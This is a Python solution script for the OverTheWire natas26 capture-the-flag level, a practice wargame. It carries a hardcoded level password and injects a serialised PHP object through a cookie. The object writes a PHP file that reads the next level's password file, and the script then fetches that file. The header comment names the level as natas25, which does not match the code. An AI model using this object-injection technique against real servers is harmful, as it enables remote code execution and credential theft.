# Name: Michael Krakovsky
# Date: May 02, 2019
# Description: Create a script to break the code on natas25.
# Version: 1.0

from requests import Session
import urllib
from base64 import b64decode
from pyperclip import copy

username = "natas26"
passwd = "oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T"
url = "http://natas26.natas.labs.overthewire.org/"      # This is how we turn on the debug variables.

session = Session()

getResponse = session.get(url, auth=(username, passwd))   # We desire to create a session ID.
# Serilised php object. This object will be unserialised into the object with the arbitrary code.
session.cookies['drawing'] = 'Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNDoiaW1nL3dpbm5lci5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czo0MzoiPD9waHAgJ2NhdCAvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOyA/PiI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjQzOiI8P3BocCAnY2F0IC9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3Jyk7ID8+Ijt9'
getResponse = session.get(url + '?x1=0&y1=0&y2=500&x2=500', auth=(username, passwd))   # Execute Serialised object and access new file
getResponse = session.get(url + 'img/winner.php', auth=(username, passwd))
print(getResponse.text)
print(50 * '-')
#print(b64decode(urllib.parse.unquote(session.cookies['drawing'])))
copy(getResponse.text)